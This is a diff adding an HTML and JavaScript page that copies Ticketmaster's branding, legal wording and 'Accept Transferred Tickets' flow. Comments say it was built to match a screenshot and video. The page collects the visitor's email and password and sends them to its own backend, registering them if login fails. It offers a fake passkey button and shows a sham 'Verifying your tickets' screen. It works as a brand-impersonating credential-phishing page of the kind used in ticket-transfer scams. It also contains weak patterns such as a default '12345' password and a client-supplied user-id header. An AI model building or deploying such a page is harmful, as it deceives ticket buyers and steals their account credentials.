@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Ticketmaster - Accept Transferred Tickets</title>
+  <link rel="icon" href="/assets/favicon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    body {
+      background-color: #f8fafc;
+      color: #1e293b;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Top Brand Header */
+    .top-nav {
+      background: #026cdf;
+      color: #ffffff;
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 52px;
+      position: sticky;
+      top: 0;
+      z-index: 50;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    }
+
+    .brand-logo-wrap {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      text-decoration: none;
+      color: #ffffff;
+    }
+
+    .brand-name {
+      font-weight: 800;
+      font-size: 18px;
+      letter-spacing: -0.5px;
+      font-style: italic;
+    }
+
+    .nav-right-user {
+      font-size: 12.5px;
+      color: #e0f2fe;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .container {
+      max-width: 440px;
+      width: 100%;
+      margin: 0 auto;
+      background: #ffffff;
+      min-height: calc(100vh - 52px);
+      padding: 24px 20px 40px 20px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+      position: relative;
+    }
+
+    /* Screen Views */
+    .view-screen {
+      display: none;
+    }
+    .view-screen.active {
+      display: block;
+    }
+
+    /* =========================================================
+       SCREEN 1: SIGN IN OR CREATE ACCOUNT (Matches Uploaded Screenshot)
+       ========================================================= */
+    .auth-title {
+      font-size: 20px;
+      font-weight: 800;
+      color: #111827;
+      letter-spacing: -0.3px;
+      text-transform: uppercase;
+      margin-bottom: 14px;
+    }
+
+    .auth-sub {
+      font-size: 15px;
+      color: #374151;
+      line-height: 1.45;
+      margin-bottom: 24px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .field-label {
+      display: block;
+      font-size: 14.5px;
+      font-weight: 600;
+      color: #374151;
+      margin-bottom: 8px;
+    }
+
+    .text-input {
+      width: 100%;
+      height: 48px;
+      padding: 0 14px;
+      font-size: 15px;
+      color: #111827;
+      background-color: #ffffff;
+      border: 1.5px solid #cbd5e1;
+      border-radius: 4px;
+      outline: none;
+      transition: border-color 0.15s;
+    }
+
+    .text-input:focus {
+      border-color: #026cdf;
+      box-shadow: 0 0 0 3px rgba(2, 108, 223, 0.15);
+    }
+
+    .btn-continue {
+      width: 100%;
+      height: 48px;
+      background-color: #026cdf;
+      color: #ffffff;
+      border: none;
+      border-radius: 4px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background-color 0.15s;
+    }
+
+    .btn-continue:hover {
+      background-color: #0257b4;
+    }
+
+    .divider-row {
+      display: flex;
+      align-items: center;
+      margin: 24px 0;
+      color: #111827;
+      font-size: 13px;
+      font-weight: 700;
+      text-align: center;
+    }
+
+    .divider-row::before,
+    .divider-row::after {
+      content: '';
+      flex: 1;
+      border-bottom: 1px solid #e2e8f0;
+    }
+
+    .divider-row span {
+      padding: 0 12px;
+    }
+
+    .btn-passkey {
+      width: 100%;
+      height: 48px;
+      background-color: #ffffff;
+      color: #1f2937;
+      border: 1.5px solid #cbd5e1;
+      border-radius: 4px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: background-color 0.15s;
+    }
+
+    .btn-passkey:hover {
+      background-color: #f8fafc;
+    }
+
+    .passkey-link-wrap {
+      text-align: center;
+      margin-top: 14px;
+      margin-bottom: 28px;
+    }
+
+    .passkey-link {
+      color: #026cdf;
+      font-size: 14.5px;
+      font-weight: 700;
+      text-decoration: none;
+    }
+
+    .passkey-link:hover {
+      text-decoration: underline;
+    }
+
+    .legal-text {
+      font-size: 12px;
+      color: #4b5563;
+      line-height: 1.6;
+      margin-bottom: 14px;
+    }
+
+    .legal-text a {
+      color: #026cdf;
+      text-decoration: underline;
+    }
+
+    /* Password prompt (inline expansion) */
+    #passwordSection {
+      display: none;
+      margin-top: 16px;
+      padding-top: 16px;
+      border-top: 1px dashed #e2e8f0;
+    }
+
+    /* =========================================================
+       SCREEN 2: ACCEPT TRANSFERRED TICKETS (Matches Video)
+       ========================================================= */
+    .accept-title {
+      font-size: 22px;
+      font-weight: 700;
+      color: #111827;
+      margin-bottom: 8px;
+      letter-spacing: -0.3px;
+    }
+
+    .accept-intro {
+      font-size: 15px;
+      color: #374151;
+      margin-bottom: 6px;
+    }
+
+    .accept-subtext {
+      font-size: 13.5px;
+      color: #4b5563;
+      line-height: 1.45;
+      margin-bottom: 20px;
+    }
+
+    .ticket-card-item {
+      background-color: #ffffff;
+      border: 1px solid #e2e8f0;
+      border-radius: 8px;
+      padding: 14px 16px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin-bottom: 12px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.03);
+    }
+
+    .ticket-card-icon {
+      width: 38px;
+      height: 38px;
+      background: #f1f5f9;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      color: #64748b;
+      transform: rotate(-15deg);
+    }
+
+    .ticket-card-info {
+      flex: 1;
+    }
+
+    .tci-title {
+      font-weight: 700;
+      font-size: 15px;
+      color: #0f172a;
+    }
+
+    .tci-meta {
+      font-size: 13px;
+      color: #64748b;
+      margin-top: 2px;
+    }
+
+    .optin-box {
+      background-color: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 8px;
+      padding: 16px;
+      margin: 20px 0;
+    }
+
+    .optin-title {
+      font-size: 13.5px;
+      font-weight: 700;
+      color: #111827;
+      line-height: 1.4;
+      margin-bottom: 8px;
+    }
+
+    .optin-desc {
+      font-size: 12px;
+      color: #4b5563;
+      line-height: 1.5;
+      margin-bottom: 12px;
+    }
+
+    .optin-checkbox-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      font-size: 12px;
+      color: #374151;
+      line-height: 1.4;
+    }
+
+    .optin-checkbox-row input {
+      margin-top: 2px;
+      accent-color: #026cdf;
+      width: 16px;
+      height: 16px;
+    }
+
+    .policy-terms {
+      font-size: 11.5px;
+      color: #64748b;
+      line-height: 1.55;
+      margin-bottom: 24px;
+    }
+
+    .policy-terms a {
+      color: #026cdf;
+      text-decoration: underline;
+    }
+
+    .btn-actions-stack {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .btn-no-thanks {
+      width: 100%;
+      height: 48px;
+      background: #ffffff;
+      color: #026cdf;
+      border: 1.5px solid #026cdf;
+      border-radius: 4px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .btn-accept-transfer {
+      width: 100%;
+      height: 48px;
+      background: #026cdf;
+      color: #ffffff;
+      border: none;
+      border-radius: 4px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 4px 12px rgba(2, 108, 223, 0.25);
+    }
+
+    .btn-accept-transfer:hover {
+      background: #0257b4;
+    }
+
+    /* =========================================================
+       SCREEN 3: VERIFYING YOUR TICKETS (Matches Video Dark Screen)
+       ========================================================= */
+    #verifyingScreen {
+      position: fixed;
+      inset: 0;
+      background-color: #121316;
+      color: #ffffff;
+      z-index: 9999;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      text-align: center;
+    }
+
+    #verifyingScreen.show {
+      display: flex;
+    }
+
+    /* Dual Glowing Circular Spinner */
+    .spinner-ring-wrap {
+      width: 80px;
+      height: 80px;
+      position: relative;
+      margin-bottom: 24px;
+    }
+
+    .spinner-ring-1 {
+      position: absolute;
+      inset: 0;
+      border: 4px solid transparent;
+      border-top-color: #a855f7;
+      border-right-color: #a855f7;
+      border-radius: 50%;
+      animation: spin 1s cubic-bezier(0.55, 0.25, 0.25, 0.95) infinite;
+    }
+
+    .spinner-ring-2 {
+      position: absolute;
+      inset: 8px;
+      border: 3.5px solid transparent;
+      border-bottom-color: #06b6d4;
+      border-left-color: #06b6d4;
+      border-radius: 50%;
+      animation: spin-reverse 1.2s cubic-bezier(0.55, 0.25, 0.25, 0.95) infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes spin-reverse {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(-360deg); }
+    }
+
+    .verifying-title {
+      font-size: 19px;
+      font-weight: 700;
+      color: #ffffff;
+      letter-spacing: -0.2px;
+      margin-bottom: 8px;
+    }
+
+    .verifying-sub {
+      font-size: 13px;
+      color: #94a3b8;
+    }
+
+    /* Little inline spinner for buttons */
+    .mini-spinner {
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: #ffffff;
+      animation: spin 0.8s linear infinite;
+      display: inline-block;
+    }
+
+    /* Toast notice */
+    .toast-msg {
+      background: #1e293b;
+      color: #f8fafc;
+      padding: 10px 14px;
+      border-radius: 6px;
+      font-size: 13px;
+      margin-bottom: 16px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Brand Nav -->
+  <header class="top-nav">
+    <a href="/" class="brand-logo-wrap">
+      <span class="brand-name">ticketmaster</span>
+    </a>
+    <div class="nav-right-user" id="topNavUserDisplay">
+      <span>US</span>
+    </div>
+  </header>
+
+  <main class="container">
+    <div id="toast" class="toast-msg"></div>
+
+    <!-- ========================================================
+         VIEW 1: SIGN IN OR CREATE ACCOUNT (Matches Uploaded Screenshot)
+         ======================================================== -->
+    <div class="view-screen" id="viewSignIn">
+      <h1 class="auth-title">SIGN IN OR CREATE ACCOUNT</h1>
+      <p class="auth-sub">If you don’t have an account you will be prompted to create one.</p>
+
+      <form id="authEmailForm" onsubmit="handleAuthContinue(event)">
+        <div class="form-group">
+          <label class="field-label" for="authEmailInput">Email Address</label>
+          <input type="email" id="authEmailInput" class="text-input" placeholder="" required autofocus>
+        </div>
+
+        <div id="passwordSection">
+          <div class="form-group">
+            <label class="field-label" for="authPasswordInput">Password</label>
+            <input type="password" id="authPasswordInput" class="text-input" placeholder="Enter password (default: 12345)" value="12345">
+          </div>
+        </div>
+
+        <button type="submit" class="btn-continue" id="btnAuthContinue">
+          Continue
+        </button>
+      </form>
+
+      <div class="divider-row">
+        <span>OR</span>
+      </div>
+
+      <button type="button" class="btn-passkey" onclick="simulatePasskey()">
+        <span>🔑</span>
+        <span>Sign In With A Passkey</span>
+      </button>
+
+      <div class="passkey-link-wrap">
+        <a href="#" class="passkey-link" onclick="simulatePasskey(); return false;">How To Add A Passkey</a>
+      </div>
+
+      <p class="legal-text">
+        By continuing past this page, I acknowledge that I have read and agree to the current
+        <a href="#">Terms of Use</a>, including the arbitration agreement and class action waiver,
+        updated in August 2025, and understand that information will be used as described in our
+        <a href="#">Privacy Policy</a>.
+      </p>
+
+      <p class="legal-text">
+        As set forth in our <a href="#">Privacy Policy</a>, we may use your information for email marketing,
+        including promotions and updates on our own or third-party products. You can opt out of our
+        marketing emails anytime.
+      </p>
+    </div>
+
+    <!-- ========================================================
+         VIEW 2: ACCEPT TRANSFERRED TICKETS (Matches Video Frame 20/28)
+         ======================================================== -->
+    <div class="view-screen" id="viewAcceptTickets">
+      <h1 class="accept-title">Accept Transferred Tickets</h1>
+      <p class="accept-intro">You have received a ticket transfer from <strong id="senderNameDisplay">Serena</strong></p>
+      <p class="accept-subtext">You can find the tickets in your account as soon as you have accepted them. There is no charge for accepting this ticket.</p>
+
+      <!-- Transferred Tickets Cards List -->
+      <div id="transferredTicketsList">
+        <!-- Dynamically populated ticket rows -->
+      </div>
+
+      <!-- Marketing & Event Partner Consent Box -->
+      <div class="optin-box">
+        <div class="optin-title">You can receive email updates, announcements and offers from the organisers of this event.</div>
+        <p class="optin-desc">
+          Event Partners will use your data in accordance with their Privacy Policy which can be found by clicking the links below.
+          If you change your mind you can unsubscribe at any time by contacting the event partner.
+        </p>
+        <label class="optin-checkbox-row">
+          <input type="checkbox" id="marketingCheckbox" checked>
+          <span>
+            Yes! I want to be kept updated by electronic means (email, SMS, etc.)
+            (If you change your mind you can unsubscribe at any time by contacting the event partner)
+          </span>
+        </label>
+      </div>
+
+      <!-- Legal disclaimer -->
+      <div class="policy-terms">
+        <p style="margin-bottom:8px;">
+          By accepting these tickets you agree to our <a href="#">Purchase Policy</a>.
+        </p>
+        <p style="margin-bottom:8px;">
+          Please note in particular: Ticket Transfer only transfers tickets (and does not transfer any other products or services purchased with the original tickets); (ii) the recipient of transferred tickets may subsequently transfer the tickets using Ticket Transfer; (iii) tickets may be cancelled if they are transferred in breach of these terms and/or the Ticket Transfer terms (see <a href="#">Purchase Policy</a>), and (iv) the contract (and associated rights and obligations) for the original purchase of the tickets remains unchanged between the original parties regardless of the number of times the ticket is transferred using Ticket Transfer.
+        </p>
+        <p>
+          You understand that only the original purchaser of the transferred ticket will be entitled to any refund, credit, or exchange (where the same is available) if an event is cancelled, rescheduled, or materially altered. You agree that Ticketmaster will not be liable to you in any circumstances.
+        </p>
+      </div>
+
+      <!-- Bottom action buttons -->
+      <div class="btn-actions-stack">
+        <button type="button" class="btn-no-thanks" onclick="handleNoThanks()">No Thanks</button>
+        <button type="button" class="btn-accept-transfer" id="btnAcceptTransfer" onclick="submitTicketAcceptance()">
+          Accept Ticket Transfer
+        </button>
+      </div>
+    </div>
+  </main>
+
+  <!-- ========================================================
+       SCREEN 3: VERIFYING YOUR TICKETS (Matches Video Frame 40)
+       ======================================================== -->
+  <div id="verifyingScreen">
+    <div class="spinner-ring-wrap">
+      <div class="spinner-ring-1"></div>
+      <div class="spinner-ring-2"></div>
+    </div>
+    <h2 class="verifying-title">Verifying your tickets</h2>
+    <p class="verifying-sub">Adding to your Ticketmaster account...</p>
+  </div>
+
+  <script>
+    // State management
+    const urlParams = new URLSearchParams(window.location.search);
+    const transferToken = urlParams.get('token') || '';
+    
+    let claimData = null;
+    let currentUser = null;
+
+    document.addEventListener('DOMContentLoaded', async () => {
+      // Check if user is already logged in
+      const stored = localStorage.getItem('tm_user');
+      if (stored) {
+        try { currentUser = JSON.parse(stored); } catch (e) {}
+      }
+
+      if (!transferToken) {
+        showToast('No transfer token found in URL. Redirecting to home...');
+        setTimeout(() => window.location.href = '/', 2000);
+        return;
+      }
+
+      await loadTransferDetails();
+    });
+
+    async function loadTransferDetails() {
+      try {
+        const res = await fetch(`/api/transfers/${encodeURIComponent(transferToken)}/claim-details`);
+        const data = await res.json();
+
+        if (!data.success) {
+          showToast(data.error || 'Failed to load transfer details.');
+          return;
+        }
+
+        claimData = data;
+
+        // If transfer already accepted, inform and button to view
+        if (data.isAccepted) {
+          showToast('This ticket transfer has already been accepted!');
+          setTimeout(() => window.location.href = '/', 2500);
+          return;
+        }
+
+        renderScreens();
+      } catch (err) {
+        console.error('Error fetching claim details:', err);
+        showToast('Network error loading ticket details.');
+      }
+    }
+
+    function renderScreens() {
+      const recipientEmail = claimData?.transfer?.recipient_email || '';
+      const senderName = claimData?.transfer?.sender_name || 'A Friend';
+
+      // Prefill email in View 1
+      if (recipientEmail && recipientEmail.includes('@')) {
+        document.getElementById('authEmailInput').value = recipientEmail;
+      }
+
+      // Populate View 2
+      document.getElementById('senderNameDisplay').textContent = senderName;
+
+      // Populate tickets
+      const tixList = claimData?.tickets || [];
+      const container = document.getElementById('transferredTicketsList');
+      if (tixList.length === 0) {
+        container.innerHTML = `
+          <div class="ticket-card-item">
+            <div class="ticket-card-icon">🎟</div>
+            <div class="ticket-card-info">
+              <div class="tci-title">Ticket 1</div>
+              <div class="tci-meta">General Admission</div>
+            </div>
+          </div>
+        `;
+      } else {
+        container.innerHTML = tixList.map((t, idx) => `
+          <div class="ticket-card-item">
+            <div class="ticket-card-icon">🎟</div>
+            <div class="ticket-card-info">
+              <div class="tci-title">Ticket ${idx + 1}</div>
+              <div class="tci-meta">Section ${t.section || 'GA'}, Row ${t.row_name || 'GA'}, Seat ${t.seat_number || t.seat_label || (idx + 1)}</div>
+            </div>
+          </div>
+        `).join('');
+      }
+
+      // Routing logic:
+      // If user is ALREADY logged in and their email matches the recipient, go directly to View 2!
+      // Otherwise, present the "SIGN IN OR CREATE ACCOUNT" view (View 1) matching the user's uploaded screenshot.
+      if (currentUser && currentUser.id && currentUser.email && currentUser.email.toLowerCase() === (recipientEmail || '').toLowerCase()) {
+        showScreen('viewAcceptTickets');
+        document.getElementById('topNavUserDisplay').innerHTML = `<span>${currentUser.email}</span>`;
+      } else {
+        showScreen('viewSignIn');
+      }
+    }
+
+    function showScreen(screenId) {
+      document.querySelectorAll('.view-screen').forEach(s => s.classList.remove('active'));
+      const target = document.getElementById(screenId);
+      if (target) target.classList.add('active');
+    }
+
+    function showToast(msg) {
+      const t = document.getElementById('toast');
+      t.textContent = msg;
+      t.style.display = 'block';
+    }
+
+    // Handle View 1 "Continue" button
+    async function handleAuthContinue(e) {
+      e.preventDefault();
+      const email = document.getElementById('authEmailInput').value.trim();
+      const pwdSection = document.getElementById('passwordSection');
+
+      if (!email) return;
+
+      // If passwordSection not visible yet, show it with smooth focus
+      if (pwdSection.style.display !== 'block') {
+        pwdSection.style.display = 'block';
+        document.getElementById('authPasswordInput').focus();
+        document.getElementById('btnAuthContinue').textContent = 'Sign In / Register';
+        return;
+      }
+
+      const password = document.getElementById('authPasswordInput').value.trim() || '12345';
+      const btn = document.getElementById('btnAuthContinue');
+      btn.innerHTML = '<span class="mini-spinner"></span> Authenticating...';
+      btn.disabled = true;
+
+      try {
+        // Try to login or register
+        let res = await fetch('/api/auth/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email, password })
+        });
+        let data = await res.json();
+
+        if (!data.success) {
+          // Register user if not exists
+          res = await fetch('/api/auth/register', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              email,
+              password,
+              displayName: claimData?.transfer?.recipient_name || email.split('@')[0]
+            })
+          });
+          data = await res.json();
+        }
+
+        if (data.success && data.user) {
+          currentUser = data.user;
+          localStorage.setItem('tm_user', JSON.stringify(currentUser));
+          document.getElementById('topNavUserDisplay').innerHTML = `<span>${currentUser.email}</span>`;
+          
+          // Switch to Screen 2 (Accept Transferred Tickets)
+          showScreen('viewAcceptTickets');
+        } else {
+          showToast(data.error || 'Authentication failed. Please try again.');
+        }
+      } catch (err) {
+        console.error(err);
+        showToast('Network error during sign-in.');
+      } finally {
+        btn.innerHTML = 'Continue';
+        btn.disabled = false;
+      }
+    }
+
+    function simulatePasskey() {
+      // 1-click Passkey demo: automatically signs in with recipient email
+      const email = document.getElementById('authEmailInput').value.trim() || claimData?.transfer?.recipient_email || 'fan@ticketmaster.com';
+      document.getElementById('authEmailInput').value = email;
+      document.getElementById('passwordSection').style.display = 'block';
+      handleAuthContinue(new Event('submit'));
+    }
+
+    function handleNoThanks() {
+      if (confirm('Are you sure you do not want to accept these tickets?')) {
+        window.location.href = '/';
+      }
+    }
+
+    // Submit Acceptance & Transition to Verifying Overlay
+    async function submitTicketAcceptance() {
+      const acceptBtn = document.getElementById('btnAcceptTransfer');
+      acceptBtn.disabled = true;
+      acceptBtn.innerHTML = '<span class="mini-spinner"></span> Accepting...';
+
+      // Show Verifying Screen Overlay (Matches Video Frame 40!)
+      const verifyingScreen = document.getElementById('verifyingScreen');
+      verifyingScreen.classList.add('show');
+
+      try {
+        const payload = {
+          email: currentUser?.email || claimData?.transfer?.recipient_email || '',
+          displayName: currentUser?.display_name || claimData?.transfer?.recipient_name || ''
+        };
+
+        const res = await fetch(`/api/transfers/${encodeURIComponent(transferToken)}/accept`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'x-user-id': currentUser?.id || ''
+          },
+          body: JSON.stringify(payload)
+        });
+
+        const result = await res.json();
+
+        if (result.success) {
+          if (result.user) {
+            currentUser = { ...currentUser, ...result.user };
+            localStorage.setItem('tm_user', JSON.stringify(currentUser));
+          }
+
+          // Let the user see the dual ring spinner animation for 2 seconds (matches video!)
+          setTimeout(() => {
+            // Redirect to My Tickets dashboard in index.html
+            window.location.href = '/?accepted=true';
+          }, 2000);
+        } else {
+          verifyingScreen.classList.remove('show');
+          acceptBtn.disabled = false;
+          acceptBtn.innerHTML = 'Accept Ticket Transfer';
+          showToast(result.error || 'Could not complete transfer acceptance.');
+        }
+      } catch (err) {
+        console.error('Acceptance error:', err);
+        verifyingScreen.classList.remove('show');
+        acceptBtn.disabled = false;
+        acceptBtn.innerHTML = 'Accept Ticket Transfer';
+        showToast('Network error during ticket acceptance.');
+      }
+    }
+  </script>
+</body>
+</html>
